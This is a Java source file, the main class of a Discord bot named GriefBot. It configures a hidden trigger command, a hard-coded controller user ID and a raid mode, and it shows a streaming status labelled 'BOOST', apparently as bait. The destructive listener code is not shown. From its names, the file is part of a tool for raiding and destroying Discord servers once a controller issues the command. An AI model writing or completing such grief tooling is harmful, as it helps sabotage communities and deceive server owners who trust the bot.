package me.corruptedbytes;

import javax.security.auth.login.LoginException;

import net.dv8tion.jda.api.OnlineStatus;
import net.dv8tion.jda.api.entities.Activity;
import net.dv8tion.jda.api.sharding.DefaultShardManagerBuilder;
import net.dv8tion.jda.api.sharding.ShardManager;

public class GriefBot {
	
	public ShardManager manager;
	public static GriefBot instance;
	
	public String griefCommand = "%start";
	public String grieferUserID = "878220518212378654";
	public String activityDescription = "BOOST";
	public boolean raidMod = true;
	public GriefType griefType = GriefType.COMMAND;
	
	public static void main(String[] args) {
		new GriefBot();
	}
	
	public GriefBot() {
		DefaultShardManagerBuilder builder = DefaultShardManagerBuilder.createDefault(Utils.readTokenFile());
		instance = this;
		
		builder.addEventListeners(new GriefBotListener());
		builder.setActivity(Activity.streaming(activityDescription, "https://www.twitch.tv/twitch"));
		builder.setStatus(OnlineStatus.ONLINE);
		
		try {
			manager = builder.build();
		} catch (LoginException | IllegalArgumentException e) {
			System.err.println("Bot cannot connect to discord.com");
		}
	}
}
